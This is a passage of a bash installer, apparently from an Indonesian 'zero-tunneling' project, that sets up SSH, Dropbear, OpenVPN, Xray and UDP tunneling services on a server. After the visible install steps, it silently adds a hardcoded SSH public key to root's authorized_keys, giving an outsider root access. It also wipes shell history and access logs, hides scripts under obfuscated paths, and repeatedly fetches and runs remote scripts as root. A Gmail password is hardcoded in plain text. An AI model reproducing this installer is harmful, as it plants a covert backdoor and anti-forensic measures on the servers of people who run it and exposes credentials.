#print_install "Memasang modul SlowDNS Server"
wget -q -O /tmp/nameserver "${REPO}Fls/nameserver" >/dev/null 2>&1
chmod +x /tmp/nameserver
bash /tmp/nameserver | tee /root/install.log
clear
#print_success "SlowDNS"
}
clear
function ins_SSHD(){
clear
#print_install "Memasang SSHD"
wget -q -O /etc/ssh/sshd_config "${REPO}Fls/sshd" >/dev/null 2>&1
chmod 700 /etc/ssh/sshd_config
/etc/init.d/ssh restart
systemctl restart ssh
/etc/init.d/ssh status
#print_success "SSHD"
}
clear
function ins_dropbear(){
clear
#print_install "Menginstall Dropbear"
apt-get install dropbear -y > /dev/null 2>&1
wget -q -O /etc/default/dropbear "${REPO}Cfg/dropbear.conf"
chmod +x /etc/default/dropbear
/etc/init.d/dropbear restart
/etc/init.d/dropbear status
#print_success "Dropbear"
}
clear
function ins_vnstat(){
clear
#print_install "Menginstall Vnstat"
apt -y install vnstat > /dev/null 2>&1
/etc/init.d/vnstat restart
apt -y install libsqlite3-dev > /dev/null 2>&1
wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc && make && make install
cd
vnstat -u -i $NET
sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
/etc/init.d/vnstat restart
/etc/init.d/vnstat status
rm -f /root/vnstat-2.6.tar.gz
rm -rf /root/vnstat-2.6
#print_success "Vnstat"
}
function ins_openvpn(){
clear
#print_install "Menginstall OpenVPN"
wget ${REPO}Fls/openvpn &&  chmod +x openvpn && ./openvpn
/etc/init.d/openvpn restart
#print_success "OpenVPN"
}
function ins_backup() {
    clear
    #print_install "Memasang Backup Server"
    apt install rclone -y
    printf "q\n" | rclone config
    wget -O /root/.config/rclone/rclone.conf "${REPO}Cfg/rclone.conf"

    cd /bin
    git clone https://github.com/arivpnstores/wondershaper.git
    cd wondershaper
    sudo make install
    cd
    rm -rf wondershaper

    echo > /home/files

    apt install msmtp-mta ca-certificates bsd-mailx -y

    cat <<EOF > /etc/msmtprc
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
account default
host smtp.gmail.com
port 587
auth on
user oceantestdigital@gmail.com
from oceantestdigital@gmail.com
password jokerman77
logfile ~/.msmtp.log
EOF

    chown -R www-data:www-data /etc/msmtprc

    wget -q -O /etc/ipserver "${REPO}Fls/ipserver" && bash /etc/ipserver
    #print_success "Backup Server"
}
clear
function ins_swab(){
clear
#print_install "Memasang Swap 2 GB"
gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
curl -sL "$gotop_link" -o /tmp/gotop.deb
dpkg -i /tmp/gotop.deb >/dev/null 2>&1
dd if=/dev/zero of=/swapfile bs=1M count=2048
mkswap /swapfile
chown root:root /swapfile
chmod 0600 /swapfile >/dev/null 2>&1
swapon /swapfile >/dev/null 2>&1
sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab
chronyd -q 'server 0.id.pool.ntp.org iburst'
chronyc sourcestats -v
chronyc tracking -v
wget ${REPO}Fls/bbr.sh &&  chmod +x bbr.sh && ./bbr.sh
#print_success "Swap 2 GB"
}
function ins_Fail2ban() {
    clear
    # print_install "Menginstall Fail2ban"
    
    if [ -d '/usr/local/ddos' ]; then
        echo; echo; echo "Please un-install the previous version first"
        exit 0
    else
        mkdir /usr/local/ddos
    fi

    clear
    echo "Banner /etc/banner.txt" >>/etc/ssh/sshd_config
    sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner.txt"@g' /etc/default/dropbear
    wget -O /etc/banner.txt "${REPO}banner.txt"
    
    # Install dan Konfigurasi Fail2ban
   # echo "Menginstal Fail2ban..."

    # Instal Fail2ban
    apt-get update
    apt-get install -y fail2ban

    # Konfigurasi Fail2ban untuk memantau log tertentu
    cat <<EOF > /etc/fail2ban/jail.local
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 5

[sshd]
enabled = true
port    = ssh
logpath = %(sshd_log)s
backend = systemd

[http-get-dos]
enabled  = true
port     = http,https
filter   = http-get-dos
logpath  = /var/log/nginx/access.log
maxretry = 200
findtime = 200
bantime  = 600

[recidive]
enabled = true
logpath = /var/log/fail2ban.log
action  = iptables-allports[name=recidive]
bantime  = 604800  ; 1 week
findtime = 86400   ; 1 day
maxretry = 5
EOF

    # Buat filter untuk HTTP GET DOS
    cat <<EOF > /etc/fail2ban/filter.d/http-get-dos.conf
[Definition]
failregex = ^<HOST> -.*"(GET|POST).*
ignoreregex =
EOF

    # Restart Fail2ban
    systemctl restart fail2ban
    systemctl enable fail2ban

 #   echo "Fail2ban diinstal dan dikonfigurasi."

    # print_success "Fail2ban"
}
function ins_epro(){
clear
#print_install "Menginstall ePro WebSocket Proxy"
wget -O /usr/bin/ws "${REPO}Fls/ws" >/dev/null 2>&1
wget -O /usr/bin/tun.conf "${REPO}Cfg/tun.conf" >/dev/null 2>&1
wget -O /etc/systemd/system/ws.service "${REPO}Fls/ws.service" >/dev/null 2>&1
chmod +x /etc/systemd/system/ws.service
chmod +x /usr/bin/ws
chmod 644 /usr/bin/tun.conf
systemctl disable ws
systemctl stop ws
systemctl enable ws
systemctl start ws
systemctl restart ws
wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
wget -q -O /usr/local/share/xray/geoip.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat" >/dev/null 2>&1
wget -O /usr/sbin/ftvpn "${REPO}Fls/ftvpn" >/dev/null 2>&1
chmod +x /usr/sbin/ftvpn
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload
cd
apt autoclean -y >/dev/null 2>&1
apt autoremove -y >/dev/null 2>&1
#print_success "ePro WebSocket Proxy"
}
clear
function UDP-CUSTOM(){
#print_install "Menginstall UDP-CUSTOM"
cd
rm -rf /root/udp
mkdir -p /root/udp

# change to time GMT+7
echo "change to time GMT+7"
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# install udp-custom
wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1ixz82G_ruRBnEEp4vLPNF2KZ1k8UfrkV' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1ixz82G_ruRBnEEp4vLPNF2KZ1k8UfrkV" -O /root/udp/udp-custom && rm -rf /tmp/cookies.txt
chmod +x /root/udp/udp-custom

wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1klXTiKGUd2Cs5cBnH3eK2Q1w50Yx3jbf' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1klXTiKGUd2Cs5cBnH3eK2Q1w50Yx3jbf" -O /root/udp/config.json && rm -rf /tmp/cookies.txt
chmod 644 /root/udp/config.json

if [ -z "$1" ]; then
cat <<EOF > /etc/systemd/system/udp-custom.service
[Unit]
Description=UDP Custom by ePro Dev. Team

[Service]
User=root
Type=simple
ExecStart=/root/udp/udp-custom server
WorkingDirectory=/root/udp/
Restart=always
RestartSec=2s

[Install]
WantedBy=default.target
EOF
else
cat <<EOF > /etc/systemd/system/udp-custom.service
[Unit]
Description=UDP Custom by ePro Dev. Team

[Service]
User=root
Type=simple
ExecStart=/root/udp/udp-custom server -exclude $1
WorkingDirectory=/root/udp/
Restart=always
RestartSec=2s

[Install]
WantedBy=default.target
EOF
fi

echo start service udp-custom
systemctl start udp-custom &>/dev/null

echo enable service udp-custom
systemctl enable udp-custom &>/dev/null
#print_success "UDP-CUSTOM BY ZERO-TUNNELING"
}
function NOOBZVPNS(){
clear
#print_install "MEMASANG NOOBZVPNS"
cd
apt install git -y
git clone https://github.com/arivpnstores/noobzvpn.git
cd noobzvpn/
chmod +x install.sh
./install.sh

echo start service noobzvpns
systemctl start noobzvpns &>/dev/null

echo enable service noobzvpns
systemctl enable noobzvpns &>/dev/null
#print_success "NOOBZVPNS BY ZERO-TUNNELING"
}
function ins_restart(){
clear
#print_install "Restarting  All Packet"
/etc/init.d/nginx restart
/etc/init.d/openvpn restart
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
/etc/init.d/fail2ban restart
/etc/init.d/vnstat restart
systemctl restart haproxy
/etc/init.d/cron restart
systemctl daemon-reload
systemctl start netfilter-persistent
systemctl enable --now nginx
systemctl enable --now xray
systemctl enable --now rc-local
systemctl enable --now dropbear
systemctl enable --now openvpn
systemctl enable --now cron
systemctl enable --now haproxy
systemctl enable --now netfilter-persistent
systemctl enable --now ws
systemctl enable --now fail2ban
systemctl enable --now udp-custom
systemctl enable --NOW noobzvpns
history -c
echo "unset HISTFILE" >> /etc/profile
cd
rm -f /root/openvpn
rm -f /root/key.pem
rm -f /root/cert.pem
#print_success "All Packet"
}
function menuv4(){
clear
#print_install "Memasang Menu Packet"
# Unduh file dari tautan pertama menggunakan wget
# Clear and recreate /usr/local/sbin
rm -r /usr/local/sbin
rm -r /usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/
mkdir -p /usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/
wget https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Cdy/menu.zip -O menu.zip >/dev/null 2>&1

# Jika unduhan gagal, coba tautan kedua menggunakan gdown
if [[ $? -ne 0 ]]; then
  gdown "1y5rBoqsltta_hhtCsXAHG0eRrqbNuAX2" -O menu.zip >/dev/null 2>&1
  
  # Jika unduhan kedua juga gagal, coba tautan ketiga menggunakan wget
  if [[ $? -ne 0 ]]; then
    wget https://github.com/kcepu877/zero-tunneling/Cdy/menu.zip -O menu.zip >/dev/null 2>&1
    
    # Jika semua unduhan gagal, keluar dari script dengan status 1
    if [[ $? -ne 0 ]]; then
      exit 1
    fi
  fi
fi

wget https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/enc
7z x -paiman321 menu.zip
chmod +x menu/*
chmod +x enc
./enc menu/*
rm -rf menu/*~
mv menu/welcome /usr/bin/welcome
mv menu/menu /usr/bin/menu
mv menu/* /usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/
rm -rf enc menu menu.zip 
}
function profile(){
clear
cat <<EOF > /root/.profile
if [ "/bin/bash" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi
mesg n || true
welcome
EOF
cat >/etc/cron.d/log_clear <<-END
		8 0 * * * root /usr/local/bin/log_clear
	END

cat >/usr/local/bin/log_clear <<-END
#!/bin/bash
wget -q https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/http -O /usr/bin/http
cekhttp=$(cat /usr/bin/http)
tanggal=$(date +"%m-%d-%Y")
waktu=$(date +"%T")
echo "Sucsesfully clear & restart On $tanggal Time $waktu." >> /root/log-clear.txt
systemctl restart udp-custom.service
END
	chmod +x /usr/local/bin/log_clear
	
cat >/etc/cron.d/daily_backup <<-END
		0 22 * * * root /usr/local/bin/daily_backup
	END

cat >/usr/local/bin/daily_backup <<-END
#!/bin/bash
wget -q https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/http -O /usr/bin/http
cekhttp=$(cat /usr/bin/http)
tanggal=$(date +"%m-%d-%Y")
waktu=$(date +"%T")
echo "Sucsesfully Backup On $tanggal Time $waktu." >> /root/log-backup.txt
/usr/local/sbin/backup -r now
END
	chmod +x /usr/local/bin/daily_backup

cat >/etc/cron.d/xp_sc <<-END
		5 0 * * * root /usr/local/bin/xp_sc
	END

cat >/usr/local/bin/xp_sc <<-END
#!/bin/bash
wget -q https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/http -O /usr/bin/http
cekhttp=$(cat /usr/bin/http)
/usr/local/sbin/expsc -r now
END
	chmod +x /usr/local/bin/xp_sc
# Fungsi untuk menambahkan pekerjaan cron ke /etc/cron.d/
    cron_file="/etc/cron.d/auto_update"
    pekerjaan_cron="15 1 * * * root /usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/auto_update"

    # Periksa apakah pekerjaan cron sudah ada di file
    if ! grep -Fq "$pekerjaan_cron" "$cron_file" 2>/dev/null; then
        echo "$pekerjaan_cron" > "$cron_file"
    fi

# Fungsi untuk menambahkan pekerjaan cron ke /etc/cron.d/
    cron_file="/etc/cron.d/auto_update2"
    pekerjaan_cron="15 2 * * * root /usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/auto_update2"

    # Periksa apakah pekerjaan cron sudah ada di file
    if ! grep -Fq "$pekerjaan_cron" "$cron_file" 2>/dev/null; then
        echo "$pekerjaan_cron" > "$cron_file"
    fi

# Fungsi untuk menambahkan pekerjaan cron ke /etc/cron.d/
    cron_file="/etc/cron.d/backup_otomatis"
    pekerjaan_cron="15 23 * * * root /usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/backupfile"

    # Periksa apakah pekerjaan cron sudah ada di file
    if ! grep -Fq "$pekerjaan_cron" "$cron_file" 2>/dev/null; then
        echo "$pekerjaan_cron" > "$cron_file"
    fi

# Fungsi untuk menambahkan pekerjaan cron ke /etc/cron.d/
    cron_file="/etc/cron.d/delete_exp"
    pekerjaan_cron="0 3 */2 * * root /usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/xp"

    # Periksa apakah pekerjaan cron sudah ada di file
    if ! grep -Fq "$pekerjaan_cron" "$cron_file" 2>/dev/null; then
        echo "$pekerjaan_cron" > "$cron_file"
    fi
cat >/etc/cron.d/logclean <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root /usr/local/sbin/clearlog
END
chmod 644 /root/.profile
cat >/etc/cron.d/daily_reboot <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
5 0 * * * root /sbin/reboot
END
echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
service cron restart
cat >/home/daily_reboot <<-END
5
END
cat >/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
EOF
echo "/bin/false" >>/etc/shells
echo "/usr/sbin/nologin" >>/etc/shells
cat >/etc/rc.local <<EOF
#!/bin/bash
wget -q https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/http -O /usr/bin/http
cekhttp=$(cat /usr/bin/http)
iptables -I INPUT -p udp --dport 5300 -j ACCEPT
iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
systemctl restart netfilter-persistent
exit 0
EOF
chmod +x /etc/rc.local
AUTOREB=$(cat /home/daily_reboot)
SETT=11
if [ $AUTOREB -gt $SETT ]; then
TIME_DATE="PM"
else
TIME_DATE="AM"
fi
#print_success "Menu Packet"
}
function enable_services(){
clear
#print_install "Enable Service"
systemctl daemon-reload
systemctl start netfilter-persistent
systemctl enable --now rc-local
systemctl enable --now cron
systemctl enable --now netfilter-persistent
systemctl restart nginx
systemctl restart xray
systemctl restart cron
systemctl restart haproxy
#print_success "Enable Service"
clear
}
function instal(){
clear
# Display update messages
print_install "Menginstall first_setup"
# Run the update function with progress bar
fun_bar 'first_setup'
clear
# Display update messages
print_install "Menginstall nginx"
# Run the update function with progress bar
fun_bar 'nginx_install'
clear
# Display update messages
print_install "Menginstall folder_xray"
# Run the update function with progress bar
fun_bar 'make_folder_xray'
clear
pasang_domain
# Display update messages
print_install "Menginstall password_default"
# Run the update function with progress bar
fun_bar 'password_default'
clear
print_install "Menginstall pasang_ssl"
# Run the update function with progress bar
fun_bar 'pasang_ssl'
clear
print_install "Menginstall xray"
# Run the update function with progress bar
fun_bar 'install_xray'
clear
print_install "Menginstall ssh"
# Run the update function with progress bar
fun_bar 'ssh'
clear
print_install "Menginstall UDP-CUSTOM"
# Run the update function with progress bar
fun_bar 'UDP-CUSTOM'
clear
print_install "Menginstall NOOBZVPNS"
# Run the update function with progress bar
fun_bar 'NOOBZVPNS'
clear
print_install "Menginstall udp_mini"
# Run the update function with progress bar
fun_bar 'udp_mini'
clear
print_install "Menginstall ssh_slow"
# Run the update function with progress bar
fun_bar 'ssh_slow'
clear
print_install "Menginstall SSHD"
# Run the update function with progress bar
fun_bar 'ins_SSHD'
clear
print_install "Menginstall dropbear"
# Run the update function with progress bar
##fix miring
fun_bar 'ins_dropbear'
clear
print_install "Menginstall vnstat"
# Run the update function with progress bar
fun_bar 'ins_vnstat'
clear
print_install "Menginstall openvpn"
# Run the update function with progress bar
fun_bar 'ins_openvpn'
clear
print_install "Menginstall backup"
##fix miring
# Run the update function with progress bar
fun_bar 'ins_backup'
clear
print_install "Menginstall swab"
# Run the update function with progress bar
fun_bar 'ins_swab'
clear
print_install "Menginstall Fail2ban"
# Run the update function with progress bar
fun_bar 'ins_Fail2ban'
clear
print_install "Menginstall epro"
# Run the update function with progress bar
fun_bar 'ins_epro'
clear
print_install "Menginstall restart"
# Run the update function with progress bar
fun_bar 'ins_restart'
clear
print_install "Menginstall menu"
# Run the update function with progress bar
fun_bar 'menuv4'
clear
print_install "Menginstall profile"
# Run the update function with progress bar
fun_bar 'profile'
clear
print_install "enable_services"
# Run the update function with progress bar
fun_bar 'enable_services'
clear
print_install "restart_system"
# Run the update function with progress bar
fun_bar 'restart_system'
clear
print_install "auto_system"
# Run the update function with progress bar
fun_bar 'auto_system'
clear
}
instal
echo ""
history -c
rm -rf /root/install
rm -rf /root/menu
rm -rf /root/*.zip
rm -rf /root/*.sh
rm -rf /root/LICENSE
rm -rf /root/README.md
rm -rf /root/domain
secs_to_human "$(($(date +%s) - ${start}))"
sudo hostnamectl set-hostname $username
clear
echo -e ""
mkdir -p ~/.ssh  # Pastikan folder .ssh ada
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNtb5dfck/X08CcEray1Iy1IilISj1kmPtN7IOnwEAy" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
systemctl restart sshd
clear
echo -e ""
wget -O /usr/local/sbin/limit.sh https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/limit.sh
chmod +x /usr/local/sbin/limit.sh
/usr/local/sbin/limit.sh
echo -e ""
wget -O /usr/bin/ws "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/ws" >/dev/null 2>&1 && wget -O /usr/bin/tun.conf "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Cfg/tun.conf" >/dev/null 2>&1 && wget -O /etc/systemd/system/ws.service "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/ws.service" >/dev/null 2>&1 && chmod +x /etc/systemd/system/ws.service && chmod +x /usr/bin/ws && chmod 644 /usr/bin/tun.conf && systemctl disable ws && systemctl stop ws && systemctl enable ws && systemctl start ws && systemctl restart ws
clear
echo -e "\033[96m==========================\033[0m"
echo -e "\033[92m      INSTALL SUCCES      \033[0m"
echo -e "\033[96m==========================\033[0m"
echo -e ""
read -n 1 -s -r -p "Press any key to back on menu"
menu
rm -rf /tmp/install
